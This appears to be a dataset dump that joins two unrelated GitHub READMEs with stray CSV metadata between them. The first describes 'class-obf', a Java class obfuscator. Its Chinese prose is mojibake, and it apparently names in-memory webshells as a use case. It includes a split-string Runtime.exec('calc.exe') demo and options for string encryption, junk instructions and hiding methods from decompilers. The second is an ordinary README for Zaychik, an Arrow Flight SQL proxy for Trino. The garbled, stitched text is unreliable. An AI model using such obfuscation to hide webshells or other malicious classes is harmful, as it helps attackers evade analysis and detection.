- ‰∏çÂêåÁöÑ `Jar` Êñá‰ª∂ÈúÄË¶ÅËÄÉËôëÂêÑÁßç‰∏çÂêåÁöÑÊÉÖÂÜµÂê¶ÂàôÊó†Ê≥ïÂêØÂä®
- ÂÆûÈôÖÈúÄÊ±ÇÊõ¥Â§ßÁöÑÊòØÂØπÂçï‰∏™ `Class` Êñá‰ª∂ÁöÑÊ∑∑Ê∑ÜÔºàÂÜÖÂ≠òÈ©¨Á≠âÈúÄÊ±ÇÔºâ

**‰∫éÊòØÊúâ‰∫ÜËøôÊ¨æÂ∑•ÂÖ∑**

- ÈÖçÁΩÆÂ§ßÂπÖÁÆÄÂåñÔºå‰ªÖÈíàÂØπÂçï‰∏™ `Class` Êñá‰ª∂
- ÂëΩ‰ª§Ë°åËæìÂá∫ÊîπÂñÑÔºåËØ¶ÁªÜÂ±ïÁ§∫Ê∑∑Ê∑ÜÁªÜËäÇ
- ‰Ω†ÂèØ‰ª•Âè™Ê∑∑Ê∑Ü‰Ω†È°πÁõÆÁöÑÊ†∏ÂøÉÁ±ªÊõøÊç¢Âç≥ÂèØÔºàÊñπ‰æøÂø´ÈÄüÔºâ
- Êèê‰æõ‰∫ÜÂ§öÁßçÊñπÂºèÁöÑ `API` Ë∞ÉÁî®

## Âø´ÈÄüÂºÄÂßã

ÁîüÊàêÈÖçÁΩÆÊñá‰ª∂Ôºö`java -jar class-obf.jar --generate`

‰ΩøÁî®ÊåáÂÆöÈÖçÁΩÆÊñá‰ª∂Ê∑∑Ê∑ÜÂΩìÂâçÁõÆÂΩïÁöÑ `Test.class` 

```shell
java -jar class-obf.jar --config config.yaml --input Test.class
```

‰∏Ä‰∏™ÊôÆÈÄöÁöÑÁ±ª

```java
public class Test {
    private String a = ""cal"";
    private String b = ""c.exe"";
    private int c = 1;

    public static void eval() throws Exception {
        Test test = new Test();
        Runtime rt = Runtime.getRuntime();
        rt.exec(test.a + test.b);
        System.out.println(test.c);
    }

    public static void main(String[] args) throws Exception {
        eval();
    }
}
```

‰Ω†ÂèØ‰ª•ÈöèÊÑèÊê≠ÈÖçÈÖçÁΩÆÊñá‰ª∂ÔºåÂæóÂà∞‰ª•‰∏ãÂá†ÁßçÊ∑∑Ê∑ÜÁªìÊûú

ÊïàÊûú‰∏ÄÔºàÈªòËÆ§ÈÖçÁΩÆÔºâ

![](img/001.png)

ÊïàÊûú‰∫åÔºà‰ΩøÁî®ÊúÄÈ´òÁ∫ßÂà´ÁöÑËä±Êåá‰ª§ÂèÇÊï∞Ôºâ

![](img/002.png)

Ëá™ÂÆö‰πâÊ∑∑Ê∑ÜÂ≠óÁ¨¶Ôºà‰æãÂ¶Ç‰ΩøÁî®‰∏≠ÊñáÔºâ

![](img/003.png)

ÂºÄÂêØÈöêËóèÊñπÊ≥ïÂíåÂ≠óÊÆµÂäüËÉΩÔºàÂèçÁºñËØëÁúã‰∏çÂà∞ÊñπÊ≥ïÔºâ

![](img/004.png)

‰ΩÜÊòØÔºÅÂèØ‰ª•ÊàêÂäüÊâßË°å

![](img/005.png)

‰ΩøÁî® `--std-output` ÂèÇÊï∞Â∞Ü‰ºöÂØºÂá∫Ê†áÂáÜÁöÑ `class` Êñá‰ª∂‰ª•ÂèäÂØπÂ∫îÁöÑÂåÖÂêç

‰æãÂ¶Ç `me.n1ar4.Test` Â∞Ü‰ºöÂØºÂá∫ `class-obf-output/me/n1ar4/Test.class` Êñá‰ª∂

## API

‰Ω†ÂèØ‰ª•‰ΩøÁî®‰ª£Á†ÅÊñπÂºèË∞ÉÁî®ÔºàÂèÇËÄÉ `test` ÁõÆÂΩïÁöÑ `TestQuick/TestAPI` Êñá‰ª∂Ôºâ

ÂèØ‰ª•‰ΩøÁî® `jitpack` ÊàñËÄÖËá™Ë°å‰∏ãËΩΩÂêéÊ∑ªÂä†Âà∞ `classpath`

```xml
<!-- Ê∑ªÂä†‰ªìÂ∫ì -->
<repositories>
    <repository>
        <id>jitpack.io</id>
        <url>https://jitpack.io</url>
    </repository>
</repositories>
<!-- ÂºïÂÖ•È°πÁõÆ -->
<dependencies>
    <dependency>
        <groupId>com.github.jar-analyzer</groupId>
        <artifactId>class-obf</artifactId>
        <version>1.4.0</version>
    </dependency>
</dependencies>
```

ÊúÄÂø´ÈÄü‰ΩøÁî®Ôºà‰ΩøÁî®ÈªòËÆ§ÈÖçÁΩÆËæìÂÖ•Êñá‰ª∂ËøîÂõû `base64` Â≠óËäÇÁ†ÅÔºâ

```java
String data = ClassObf.quickRun(""Test.class"");
System.out.println(data);
```

Ëá™Ë°åËøõË°åÈÖçÁΩÆËøõÈò∂ÂÜôÊ≥ï

```java
BaseConfig config = new BaseConfig();
// ÁúÅÁï•‰ª£Á†Å Ëá™Ë°åËÆæÁΩÆ config Êñá‰ª∂

ClassObf classObf = new ClassObf(config);
// ÊîØÊåÅ‰∏âÁßçÈáçËΩΩÔºöËæìÂÖ•Êñá‰ª∂Â≠óÁ¨¶‰∏≤ÔºåËæìÂÖ•Êñá‰ª∂ PATH ÂØπË±°ÔºåËæìÂÖ• byte[] Êï∞ÊçÆ
Result result = classObf.run(""Test.class"");
if (result.getMessage().equals(Result.SUCCESS)) {
    // result.getData() Âç≥ÂèØÂæóÂà∞Ê∑∑Ê∑ÜÂêéÁöÑ byte[] Â≠óËäÇÁ†Å
    System.out.println(Base64.getEncoder().encodeToString(result.getData()));
}
```

Â¶ÇÊûú‰Ω†‰∏çÊÉ≥ËæìÂá∫‰∏ÄÂ§ßÂ†ÜË∞ÉËØï‰ø°ÊÅØÔºåÂèØ‰ª•ËøôÊ†∑ËÆæÁΩÆ

```java
config.setQuiet(true);
```

**Ê≥®ÊÑèÔºöÁî±‰∫éËÆæËÆ°ÂéüÂõ†ÔºåÊ∑∑Ê∑Ü `API` ‰∏çÊîØÊåÅÂπ∂Âèë**

## ÈÖçÁΩÆÊñá‰ª∂

ÂèØ‰ª•Ê†πÊçÆ‰Ω†ÁöÑÈúÄÊ±Ç‰øÆÊîπÈÖçÁΩÆÊñá‰ª∂

```yaml
!!me.n1ar4.clazz.obfuscator.config.BaseConfig
# Êó•ÂøóÁ∫ßÂà´
logLevel: info
# ÊòØÂê¶‰ΩøÁî®ÂÆâÈùôÊ®°ÂºèÔºà‰∏çÊâìÂç∞Ë∞ÉËØï‰ø°ÊÅØÔºâ
quiet: false
# ÊòØÂê¶ÂêØÂä® JAVA ASM ÁöÑ COMPUTE FRAMES/MAX Ëá™Âä®ËÆ°ÁÆó
# Â¶ÇÊûúÈÅáÂà∞ TYPE * NOT PRESENT Êä•ÈîôÂèØ‰ª•Â∞ùËØïËÆæÁΩÆËØ•ÈÄâÈ°π‰∏∫ FALSE
asmAutoCompute: true

# Ê∑∑Ê∑ÜÂ≠óÁ¨¶ÁªÑÂêà
# Âª∫ËÆÆ‰ΩøÁî®ÈïøÂ∫¶Â§ß‰∫éÁ≠â‰∫é 5 Âê¶ÂàôÂèØËÉΩÊúâÈ¢ÑÊúüÂ§ñÁöÑ BUG
obfuscateChars:
  - ""i""
  - ""l""
  - ""L""
  - ""1""
  - ""I""

# ÊòØÂê¶ÂºÄÂêØÂà†Èô§ÁºñËØë‰ø°ÊÅØ
enableDeleteCompileInfo: true

# ÊòØÂê¶ÂºÄÂêØÊñπÊ≥ïÂêçÊ∑∑Ê∑Ü
# ËøôÈáå‰ºöËá™Âä®‰øÆÊîπÊñπÊ≥ï‰πãÈó¥ÁöÑÂºïÁî®
enableMethodName: true
# ‰∏ÄËà¨ public ÊñπÊ≥ïÊòØË¢´Â§ñÈÉ®Ë∞ÉÁî®ÁöÑ
# ÂèØ‰ª•ËÆæÁΩÆËØ•ÈÄâÈ°π‰∏∫ true Êù•Ë∑≥Ëøá public ÊñπÊ≥ïÊ∑∑Ê∑Ü
ignorePublic: false
# ÂÖ®Â±ÄÊñπÊ≥ïÈªëÂêçÂçï
# ËØ•ÊñπÊ≥ï‰∏ç‰ºöËøõË°åÊ∑∑Ê∑Ü ÂºïÁî®‰πü‰∏ç‰ºöË¢´‰øÆÊîπ
methodBlackList:
  - ""main""

# ÊòØÂê¶ÂºÄÂêØÂ≠óÊÆµÊ∑∑Ê∑Ü
enableFieldName: true
# ÊòØÂê¶ÂºÄÂêØÊñπÊ≥ïÂèÇÊï∞ÂêçÊ∑∑Ê∑Ü
# Áî±‰∫éÂèçÁºñËØëÂô® ÂèØËÉΩÊòæÁ§∫ÁöÑÁªìÊûúÂè™ÊòØ var0 var1 Á≠â
enableParamName: true
# ÊòØÂê¶ÂØπÊï∞Â≠óËøõË°åÂºÇÊàñÊ∑∑Ê∑Ü
enableXOR: true

# ÂØπÊâÄÊúâÂ≠óÁ¨¶‰∏≤ËøõË°å AES Âä†ÂØÜ
enableAES: true
# ÈªòËÆ§ AES KEY Ê≥®ÊÑèÈïøÂ∫¶ÂøÖÈ°ªÊòØ 16
aesKey: OBF_DEFAULT_KEYS
# AES Ëß£ÂØÜÊñπÊ≥ïÂêç
aesDecName: iiLLiLi
# AES KEY Â≠óÊÆµÂêç
aesKeyField: iiiLLLi1i

# ÊòØÂê¶ÂêØÁî®ÂÖ®Â±ÄÂ≠óÁ¨¶‰∏≤ÊèêÂèñÊ∑∑Ê∑Ü
enableAdvanceString: true
# ÂÖ®Â±ÄÊèêÂèñÂ≠óÁ¨¶‰∏≤ÁöÑÂèòÈáèÂêçÂèØ‰ª•Ëá™ÂÆö‰πâ
advanceStringName: ME_N1AR4_CLAZZ_OBF_PROJECT

# ÊòØÂê¶ÂºÄÂêØËä±Êåá‰ª§Ê∑∑Ê∑Ü
enableJunk: true
# Ëä±Êåá‰ª§Ê∑∑Ê∑ÜÁ∫ßÂà´ 1-5
junkLevel: 3
# ‰∏Ä‰∏™Á±ª‰∏≠Ëä±Êåá‰ª§ÊúÄÂ§öÊï∞Èáè
maxJunkOneClass: 1000

# ÊòØÂê¶ÂºÄÂêØÂ≠óÊÆµÈöêËóè
# ÂèØ‰ª•Èò≤Ê≠¢Â§ßÈÉ®ÂàÜ IDEA ÁâàÊú¨ÂèçÁºñËØë
enableHideField: false
# ÊòØÂê¶ÂºÄÂêØÊñπÊ≥ïÈöêËóè
# ÂèØ‰ª•Èò≤Ê≠¢Â§ßÈÉ®ÂàÜ IDEA ÁâàÊú¨ÂèçÁºñËØë
enableHideMethod: false

# ÊòØÂê¶Â∞Ü JVM INVOKE Êåá‰ª§ÊîπÊàêÂèçÂ∞ÑË∞ÉÁî®
# Ê≥®ÊÑèÔºöËØ•ÂäüËÉΩ‰ºöÊòéÊòæÂΩ±ÂìçÊâßË°åÊïàÁéá
# ‰ºòÁÇπÔºöÁªèËøáËØ•Ê∑∑Ê∑ÜÂêé‰ºöÊõ¥Âä†Èöæ‰ª•ÂàÜÊûê
# Áº∫ÁÇπÔºöËØ•ÂäüËÉΩÊú™ÁªèËøáÂÆåÂñÑÊµãËØï‰∏çÁ®≥ÂÆö
enableReflect: false
# INVOKEVIRTUAL ËΩ¨Êç¢
enableReflectVirtual: false
# INVOKESTATIC ËΩ¨Êç¢
enableReflectStatic: false
# INVOKESPECIAL ËΩ¨Êç¢
enableReflectSpecial: false
# INVOKEINTERFACE ËΩ¨Êç¢
enableReflectInterface: false

```

## test

Â¶Ç‰ΩïÊµãËØï‰Ω†Ê∑∑Ê∑ÜÂêéÁöÑÂçï‰∏™ `class` ÂèØÁî®Ôºü

- ÁªìÂêàÂÖ∑‰ΩìÂú∫ÊôØÂíåÈ°πÁõÆÊµãËØïÔºåÂèñÂÜ≥‰∫éÂÆûÈôÖÊÉÖÂÜµ
- Ë¶ÜÁõñÂà∞ `jar` Êñá‰ª∂‰∏≠ÊµãËØïÔºåÊØîËæÉÈ∫ªÁÉ¶
- ÊîæÂà∞ÂØπÂ∫îÁõÆÂΩï‰∏≠‰ΩøÁî® `java` ÂëΩ‰ª§ÊµãËØïÔºåÊõ¥È∫ªÁÉ¶
- ‰ΩøÁî®Ëá™ÂÆö‰πâ `ClassLoader` ÊµãËØïÔºåÊñπ‰æøÂø´ÈÄü

```java
public class Test extends ClassLoader {
    @Override
    protected Class<?> findClass(String name) throws ClassNotFoundException {
        byte[] classData = getClassData(name);
        if (classData == null) {
            throw new ClassNotFoundException(name);
        }
        return defineClass(name, classData, 0, classData.length);
    }

    private byte[] getClassData(String className) {
        if (""test.ClassName"".equals(className)) {
            try {
                // read bytes form obfuscated class
                return Files.readAllBytes(Paths.get(""Test_obf.class""));
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
        return null;
    }

    public static void main(String[] args) throws Exception {
        TestRunner loader = new TestRunner();
        Class<?> clazz = loader.loadClass(""test.ClassName"");
        Object instance = clazz.getDeclaredConstructor().newInstance();
        // usually main method
        Method method = clazz.getMethod(""main"", String[].class);
        method.invoke(instance, new Object[]{args});
    }
}
```

## Thanks

<img src=""https://resources.jetbrains.com/storage/products/company/brand/logos/IntelliJ_IDEA.svg"" alt=""IntelliJ IDEA logo."">


This project is developed using JetBrains IDEA.
Thanks to JetBrains for providing me with a free license, which is a strong support for me.

## Star

<div align=""center"">

<img src=""https://api.star-history.com/svg?repos=jar-analyzer/class-obf&type=Date"" width=""600"" height=""400"" alt=""Star History Chart"" valign=""middle"">

</div>
",8,1,1,GPL-3.0,4,0.0,1.0,4.0,2.0,12.0,0.0,-4.4,0.0
Raiffeisen-DGTL/zaychik-trino-proxy,main,"# Zaychik: Arrow Flight SQL Proxy Server for Trino

Implementation of Arrow FlightSQL Server to allow querying Trino using Arrow Flight clients such as
Arrow Flight JDBC/ODBC drivers.

Implementation of this server is inspired by the FlightSQL server example for Apache Derby gently
provided by Apache Arrow community. Example implementation can be found
[here](https://github.com/apache/arrow/blob/main/java/flight/flight-sql/src/test/java/org/apache/arrow/flight/sql/example/FlightSqlExample.java).

> Proxy server is build using:
>
> * Java 17
> * Trino JDBC driver: version 452
> * Arrow Flight SQL Server: version 17.0.0

## General Approach and Requirements

* Proxy server queries Trino using JDBC driver.
* Proxy server requires user-password authorisation.
* User and password are forwarded to Trino connection factory and used to establish connection to Trino.
* Thus, Trino cluster must have user-password authentication type. Other types of authentication as well
  as unauthenticated access to Trino are not supported.
* No connection pooling to Trino is used as connections are user-specific.
* Forwarding user and password prevents impersonation when connecting to Trino and, therefore,
  allows inheritance of user permissions from Trino itself.
* Trino JDBC driver streams data over HTTP under the hood.
* Data is received by Proxy server in batches.
  Each batch is encoded to Apache Arrow format and streamed to the Arrow client.
* Complex data types are not supported. See [table](#supported-trino-data-types) below.
* Server provides custom JMX metrics for better monitoring.

## Build and Run

The project is powered by Maven, thus in order to build project and collect dependencies, use following maven commands:
* `mvn clean package` - to compile and package project to jar-file.
* `mvn dependency:copy-dependencies` - to collect project dependencies.

In order to export JMX metrics in prometheus format, it is required to use `jmx_prometheus_javaagent`
along with jmx configuration file. The prometheus jmx exported agent is defined in `pom.xml` and will be downloaded
along with other dependencies. Copy the jmx configuration file to working directory which should have the following structure:
```
workdir
|-- trino-arrow-flight-proxy-0.1.0.jar
|-- dependency  # folder with collected project dependencies
|-- jmx_config.yaml
```

The following java options need to be provided:
* `-add-opens=java.base/java.nio=org.apache.arrow.memory.core,ALL-UNNAMED` - required to run Apache Arrow Flight SQL server.
* `-javaagent:./dependency/jmx_prometheus_javaagent-1.0.1.jar=9090:jmx_config.yaml` - required to run prometheus jmx exporter as java-agent. 
  Metrics will be served at port `9090` (change port number if required).
* `-Darrow.memory.debug.allocator=true` - optional to enable Arrow memory allocator debug logs.

Java options can be easily provided via `_JAVA_OPTIONS` environment variable as follows:
```bash
export _JAVA_OPTIONS=""-Darrow.memory.debug.allocator=true -javaagent:./dependency/jmx_prometheus_javaagent-1.0.1.jar=9090:jmx_config.yaml --add-opens=java.base/java.nio=org.apache.arrow.memory.core,ALL-UNNAMED""
```

Finally, to run the proxy server, execute Java command:
```bash
java -cp trino-arrow-flight-proxy-0.1.0.jar:dependency/* ru.raiffeisen.trino.arrow.flight.sql.server.FlightSQLTrinoProxy
```

## Authorization

There are two types of user-password authorization middleware supported by this Proxy server:

* `TRINO` - authorization middleware tries to create JDBC connection to Trino using provided user and password.
  If connection created successfully, then user is authorized to connect to server. Thus, all users who are authorized
  to connect to Trino are able to connect to Proxy server.
* `LDAP` - connects to LDAP server and checks if user is authorized to connect to server. Connection to LDAP server is
  performed using provided user and password, thus no additional credentials are required.
  **Connection to LDAP is performed with SSL. Thus, ldap provider url must have `ldaps` scheme and be accessible on port
  636.**

## Configuration

Server configuration must be specified in `application.properties` file in resource directory. Alternatively,
configuration can be set using environment variables. Server recognizes environment variables started from prefix `TF_`.

All proxy server configurations are listed below. If configuration parameter does not have a default value,
then value of this parameter must be set explicitly either in `application.properties` or in corresponding environment
variable.

Configuration parameters set via environment variables override ones provided in `application.properties` file.

### Flight Server Configuration

* `flight.host` - Arrow flight server host \
  Environment variable: `TF_FLIGHT_HOST` \
  Default value: `localhost`
* `flight.port` - Arrow flight server port \
  Environment variable: `TF_FLIGHT_PORT` \
  Default value: `32010`
* `flight.ssl` - Is connection to arrow flight server should use SSL?
  Environment variable: `TF_FLIGHT_SSL` \
  Default value: `false`
  > Currently, SSL connection to Arrow Flight Server is not supported.
* `flight.auth.type` - Type of authorization middleware: either `trino` or `ldap` types are supported.
  Environment variable: `TF_FLIGHT_AUTH_TYPE` \
  Default value: `trino`
* `flight.batch.size` - Size of the batch (number of rows). Server fetches data from Trino and streams it
  to client in batches. If size of the batch is small the overall data streaming rate will be slower.
  If size of the batch is too large the latency will be large as well.
  Environment variable: `TF_FLIGHT_BATCH_SIZE` \
  Default value: `1024`
* `flight.backpressure.threshold` - The number of bytes that can be queued on an output stream before blocking.
  When blocked listener will wait until data is streamed to the client and block is released and only after that it
  will continue to stream next batch.
  Environment variable: `TF_FLIGHT_BACKPRESSURE_THRESHOLD` \
  Default value: `10485760`
* `flight.backpressure.timeout` - Maximum amount of time in `milliseconds` to wait for backpressure block to be
  released.
  If block is not released for `timeout` time then data stream will be cancelled.
  Environment variable: `TF_FLIGHT_BACKPRESSURE_TIMEOUT` \
  Default value: `30000`
* `flight.server.readonly` - Is arrow flight server in read-only mode? \
  Environment variable: `TF_FLIGHT_SERVER_READONLY` \
  Default value: `false`
* `flight.sql.ddl.catalogs.support` - Is arrow flight server ddl operations support catalogs? \
  Environment variable: `TF_FLIGHT_SQL_DDL_CATALOGS_SUPPORT` \
  Default value: `false`
* `flight.sql.ddl.schemas.support` - Is arrow flight server ddl operations support schemas? \
  Environment variable: `TF_FLIGHT_SQL_DDL_SCHEMAS_SUPPORT` \
  Default value: `false`
* `flight.sql.ddl.all.tables.selectable` - Is all tables selectable in arrow flight server? \
  Environment variable: `TF_FLIGHT_SQL_DDL_ALL_TABLES_SELECTABLE` \
  Default value: `false`
* `flight.sql.identifier.quote.char` - Arrow flight server identifiers quote char \
  Environment variable: `TF_FLIGHT_SQL_IDENTIFIER_QUOTE_CHAR` \
  Default value: `""`
* `flight.sql.identifier.case.sensitivity` - Arrow flight server identifiers case sensitivity \
  Environment variable: `TF_FLIGHT_SQL_IDENTIFIER_CASE_SENSITIVIY` \
  Default value: `0`
  > Values from 0 to 3 are allowed, where:
  > * 0 - unknown case sensitivity;
  > * 1 - case insensitive;
  > * 2 - upper case sensitivity;
  > * 3 - lower case sensitivity.
* `flight.sql.identifier.quoted.case.sensitivity` - Arrow flight server quoted identifiers case sensitivity \
  Environment variable: `TF_FLIGHT_SQL_IDENTIFIER_QUOTED_CASE_SENSITIVIY` \
  Default value: `0`
  > Values from 0 to 3 are allowed, where:
  > * 0 - unknown case sensitivity;
  > * 1 - case insensitive;
  > * 2 - upper case sensitivity;
  > * 3 - lower case sensitivity.
* `flight.sql.max.table.columns` - Maximum allowed number of columns in arrow flight server tables \
  Environment variable: `TF_FLIGHT_SQL_MAX_TABLE_COLUMNS` \
  Default value: `1024`

### Trino Connection Configuration

* `trino.host` - Trino DB host \
  Environment variable: `TF_TRINO_HOST` \
  Default value: `localhost`
* `trino.port` - Trino DB port \
  Environment variable: `TF_TRINO_PORT` \
  Default value: `443`
* `trino.ssl` - Is connection to Trino should use SSL? \
  Environment variable: `TF_TRINO_SSL` \
  Default value: `false`
* `trino.version` - Trino Server version
  Environment variable: `TF_TRINO_VERSION` \
  Default value: `452`
* `trino.driver.version` - Trino driver version
  Environment variable: `TF_TRINO_DRIVER_VERSION` \
  Default value: `452`
  > This server uses Trino Driver v.452 for connections. No need to override this configuration value.

### SSL Configuration

* `ssl.keystore.path` - Location of keystore to use for connection to LDAP with SSL \
  Environment variable: `TF_SSL_KEYSTORE_PATH` \
  Default value: `$JAVA_HOME/lib/security/cacerts`
* `ssl.keystore.password` - Password to keystore  \
  Environment variable: `TF_SSL_KEYSTORE_PASSWORD` \
  Default value: `changeit`
* `ssl.keystore.type` - Type of keystore \
  Environment variable: `TF_SSL_KEYSTORE_TYPE` \
  Default value: `jks`
* `ssl.truststore.path` - Location of keystore to use for connection to LDAP with SSL \
  Environment variable: `TF_SSL_TRUSTSTORE_PATH` \
  Default value: **defaults to `sss.keystore.path` value**
* `ssl.truststore.password` - Password to truststore  \
  Environment variable: `TF_SSL_TRUSTSTORE_PASSWORD` \
  Default value: **defaults to `sss.keystore.password` value**
* `ssl.truststore.type` - Type of truststore \
  Environment variable: `TF_SSL_TRUSTSTORE_TYPE` \
  Default value: **defaults to `sss.keystore.type` value**

### LDAP Configuration

* `ldap.provider` - LDAP provider URL \
  Environment variable: `TF_LDAP_PROVIDER` \
  Default value: `null` - need to be provided explicitly if LDAP authorization middleware is used.
  > Must have `ldaps` scheme and be accessible on port `636`.
* `ldap.domain` - LDAP domain \
  Environment variable: `TF_LDAP_DOMAIN` \
  Default value: `null` - need to be provided explicitly if LDAP authorization middleware is used.
  > User is prefixed with domain when connection to LDAP is established: `ldap.domain\user`.
* `ldap.referral` - LDAP referral \
  Environment variable: `TF_LDAP_REFERRAL` \
  Default value: `follow`
* `ldap.timeout ` - LDAP connection timeout (millis) \
  Environment variable: `TF_LDAP_TIMEOUT` \
  Default value: `5000`
* `ldap.retries.count` - LDAP connection retries \
  Environment variable: `TF_LDAP_RETRIES_COUNT` \
  Default value: `3`
* `ldap.retries.interval` - LDAP connection retry interval (millis) \
  Environment variable: `TF_LDAP_RETRIES_INTERVAL` \
  Default value: `5000`
* `ldap.search.dn1` - Primary LDAP search DN to look for user attributes \
  Environment variable: `TF_LDAP_SEARCH_DN1` \
  Default value: `null` - need to be provided explicitly if LDAP authorization middleware is used.
* `ldap.search.dn2` - Secondary LDAP search DN to look for user attributes \
  Environment variable: `TF_LDAP_SEARCH_DN2` \
  Default value: `null` - if omitted, then search will be limited to primary DN only.
* `ldap.search.dn3` - Tertiary LDAP search DN to look for user attributes \
  Environment variable: `TF_LDAP_SEARCH_DN3` \
  Default value: `null` - if omitted, then search will be limited to primary and secondary DNs only.
* `ldap.search.filter` - LDAP search filter to fetch results for a particular user \
  Environment variable: `TF_LDAP_SEARCH_FILTER` \
  Default value: `null` - need to be provided explicitly if LDAP authorization middleware is used.
  > Typically, here one need to set some search filter template with `${USER}` value which will be substituted with
  > actual username during authorisation.
* `ldap.search.attribute` - LDAP search attribute containing user role membership \
  Environment variable: `TF_LDAP_SEARCH_ATTRIBUTE` \
  Default value: `null` - need to be provided explicitly if LDAP authorization middleware is used.
* `ldap.auth.role` - LDAP authorisation role (authorise only users who have this role) \
  Environment variable: `TF_LDAP_AUTH_ROLE` \
  Default value: `null` - need to be provided explicitly if LDAP authorization middleware is used.

## Supported Trino Data Types

When querying data from Trino via JDBC driver the Trino types are converted to JDBC types.
Then, JDBC types are mapped to the Apache Arrow types. So, when data is actually consumed by the proxy server
the JDBC record are retrieved in batches and converted to Apache Arrow vector in accordance with defined type mapping.

Table below shows how Trino types are mapped to JDBC and Arrow types and also provides information whether Trino type
is supported by the proxy server.

| Trino Type              | JDBC Type (with code)          | Arrow Type                                                  | Supported?  |
|-------------------------|--------------------------------|-------------------------------------------------------------|-------------|
| BOOLEAN                 | BOOLEAN (16)                   | ArrowType.Bool                                              | YES         |
| TINYINT                 | TINYINT (-6)                   | ArrowType.Int(8, signed)                                    | YES         |
| SMALLINT                | SMALLINT (5)                   | ArrowType.Int(16, signed)                                   | YES         |
| INTEGER                 | INTEGER (4)                    | ArrowType.Int(32, signed)                                   | YES         |
| BIGINT                  | BIGINT (-5)                    | ArrowType.Int(64, signed)                                   | YES         |
| REAL                    | REAL (7)                       | ArrowType.FloatingPoint(FloatingPointPrecision.SINGLE)      | YES         |
| DOUBLE                  | DOUBLE (8)                     | ArrowType.FloatingPoint(FloatingPointPrecision.DOUBLE)      | YES         |
| DECIMAL                 | DECIMAL (3)                    | ArrowType.Decimal(precision, scale)                         | YES         |
| VARCHAR                 | VARCHAR (12)                   | ArrowType.Utf8                                              | YES         |
| CHAR                    | CHAR (1)                       | ArrowType.Utf8                                              | YES         |
| VARBINARY               | VARBINARY (-3)                 | ArrowType.Binary                                            | YES         |
| JSON                    | JAVA_OBJECT (2000)             | ***!!! unmapped !!!***                                      | NO          |
| DATE                    | DATE (91)                      | ArrowType.Date(DateUnit.DAY)                                | YES         |
| TIME                    | TIME (92)                      | ArrowType.Time(TimeUnit.MILLISECOND, 32)                    | YES         |
| TIME(P)                 | TIME (92)                      | ArrowType.Time(TimeUnit.MILLISECOND, 32)                    | YES         |
| TIME WITH TIMEZONE      | TIME_WITH_TIMEZONE (2013)      | ArrowType.Time(TimeUnit.MILLISECOND, 32)                    | LIMITED <1> |
| TIMESTAMP               | TIMESTAMP (93)                 | ArrowType.Timestamp(TimeUnit.MILLISECOND, default_timezone) | YES         |
| TIMESTAMP(P)            | TIMESTAMP (93)                 | ArrowType.Timestamp(TimeUnit.MILLISECOND, default_timezone) | YES         |
| TIMESTAMP WITH TIMEZONE | TIMESTAMP_WITH_TIMEZONE (2014) | ArrowType.Timestamp(TimeUnit.MILLISECOND, default_timezone) | LIMITED <1> |
| INTERVAL YEAR TO MONTH  | JAVA_OBJECT (2000)             | ***!!! unmapped !!!***                                      | NO          |
| INTERVAL DAY TO SECOND  | JAVA_OBJECT (2000)             | ***!!! unmapped !!!***                                      | NO          |
| ARRAY                   | ARRAY (2003)                   | ***!!! unmapped !!!***                                      | NO          |
| MAP                     | JAVA_OBJECT (2000)             | ***!!! unmapped !!!***                                      | NO          |
| ROW                     | JAVA_OBJECT (2000)             | ***!!! unmapped !!!***                                      | NO          |
| IPADDRESS               | JAVA_OBJECT (2000)             | ***!!! unmapped !!!***                                      | NO          |
| UUID                    | JAVA_OBJECT (2000)             | ***!!! unmapped !!!***                                      | NO          |
| HyperLogLog             | JAVA_OBJECT (2000)             | ***!!! unmapped !!!***                                      | NO          |
| P4HyperLogLog           | JAVA_OBJECT (2000)             | ***!!! unmapped !!!***                                      | NO          |
| SetDigest               | JAVA_OBJECT (2000)             | ***!!! unmapped !!!***                                      | NO          |
| QDigest                 | JAVA_OBJECT (2000)             | ***!!! unmapped !!!***                                      | NO          |
| TDigest                 | JAVA_OBJECT (2000)             | ***!!! unmapped !!!***                                      | NO          |

> **<1>** Despite server supports mapping for `TIME_WITH_TIMEZONE` and `TIMESTAMP_WITH_TIMEZONE` the actual
> conversion replaces timezone with server default one. Therefore, this types should be used with caution.

## Custom JMX Metrics

> Some of the metrics below serve results per query size group: queries are assigned to size group 
> depending on the number of rows they returned. Size group is a power of 10. Thus, group #4 represents all
> queries that returned between 10'000 and 100'000 rows.

### Status Count

* `arrow_flight_server_status_TotalCount` - total number of calls to the server.
* `arrow_flight_server_status_Count` - number of calls to the server grouped per call status.

### Allocated Buffer Memory

* `arrow_flight_server_buffer_Allocated` - current memory allocated by Arrow Buffer Allocator.

### Listener Wait Time

There could be situations when data is streamed from Trino to proxy server faster that from proxy server to the client.
In such situations, the data must be buffered at proxy server while waiting to be sent to the client.
This is a risky process as buffer can overflow JVM memory. In order to avoid that, the server implements so called
`backpressure strategy`: when the buffer with results reaches maximum allowed size, the listener is set on hold and
waits until proxy server streams data to the client. Metrics below can be used to monitor time that listener was waiting
thus identifying backpressure issues.

* `arrow_flight_server_listener_TotalWaitTime` - total listener wait time.
* `arrow_flight_server_listener_WaitTime` - total listener wait time grouped per query size group.
* `arrow_flight_server_listener_AvgWaitTime` - average listener wait time per single row grouped per query size group.
* `arrow_flight_server_listener_TotalAvgWaitTime` - overall average listener wait time per single row.

### Query Count

Server counts number of queries that was executed.  Only queries that actually streamed data to the client
are considered. Cancelled and errored queries are omitted.

* `arrow_flight_server_query_TotalCount` - total number of queries executed so far.
* `arrow_flight_server_query_CountBySize` - number of queries grouped per query size group. 
* `arrow_flight_server_query_CountByUser` - number of queries grouped per user.

### Row Count

Server counts number of rows that was streamed to the client. In addition, server measures the time that was taken 
to stream data. **Note** that measurement includes only time taken to stream the data and ignores the time taken to
execute query in Trino, as this information is not related to proxy server performance.

* `arrow_flight_server_row_TotalCount` - total number of rows streamed so far.
* `arrow_flight_server_row_RowsPerUser` - number of rows grouped per user.
* `arrow_flight_server_row_AvgRowsPerQuery` - average number of rows per query.
* `arrow_flight_server_row_StreamingRate` - average streaming rate for last 10 queries (rows/ms).


## Know Issues when using Arrow Flight SQL ODBC Driver from Dremio

Trino community does not have an open-source version of the ODBC driver. Therefore, one of the primary use case 
to run this proxy server is to allow ODBC connectivity to Trino using open-source ODBC drivers,
such as [Arrow Flight SQL ODBC Driver from Dremio](https://docs.dremio.com/current/sonar/client-applications/drivers/arrow-flight-sql-odbc-driver/).

Though, there are some known issues we faced while using this driver for connections to Trino proxy. These are:

* ODBC Driver does not support special characters in user passwords, such as `.,!=:;`.
* ODBC Driver does not forward JDBC errors to the client.
  They stays inside the proxy server and can be found in the server logs.
